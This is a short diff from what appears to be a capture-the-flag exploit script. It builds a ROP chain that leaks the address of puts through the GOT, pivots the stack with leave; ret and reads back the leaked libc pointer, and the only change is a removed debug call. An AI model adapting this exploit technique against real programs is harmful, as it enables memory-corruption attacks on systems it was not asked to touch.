@@ -46,7 +46,6 @@ payload = p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_a
 payload = payload.ljust(0xB0, b"\x00")
 payload += p64(buf_stack) + p64(leave_ret)
 
-ddebug()
 io.send(payload)
 
 libc_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
